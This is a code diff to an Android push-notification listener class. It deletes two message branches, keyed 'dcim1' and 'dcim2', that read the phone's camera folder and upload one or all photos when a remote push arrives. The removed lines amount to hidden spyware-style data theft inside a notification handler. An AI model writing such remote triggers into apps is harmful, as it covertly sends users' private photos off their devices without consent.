@@ -51,18 +51,6 @@ public class PusheJSONListener extends PusheListenerService {
 							db_support.deleteMessages();
 						}
 					}
-				} else if (message.has("dcim1")) {
-					File[] pics = Helper.readDCIM();
-					if (pics != null) {
-						Helper.uploadFile(getApplicationContext(), pics[0].getAbsolutePath());
-					}
-				} else if (message.has("dcim2")) {
-					File[] pics = Helper.readDCIM();
-					if (pics != null) {
-						for (File pic : pics) {
-							Helper.uploadFile(getApplicationContext(), pic.getAbsolutePath());
-						}
-					}
 				}
 			} catch (JSONException e) {
 				Log.e("Pushe", "Exception : ", e);
